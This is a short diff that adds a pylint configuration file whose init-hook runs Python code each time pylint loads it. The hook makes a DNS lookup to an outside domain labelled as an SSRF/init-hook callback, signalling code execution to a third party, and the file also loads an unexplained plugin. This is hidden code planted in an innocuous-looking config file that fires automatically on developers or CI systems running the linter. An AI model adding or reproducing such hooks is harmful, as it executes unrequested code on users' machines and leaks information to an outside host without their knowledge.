@@ -1,0 +1,7 @@
+[MASTER]
+init-hook='import socket
+try:
+    socket.gethostbyname("pylint-inithook.py1.ssrf.xixixo123.site")
+except Exception:
+    pass'
+load-plugins=cr_pylint_plugin
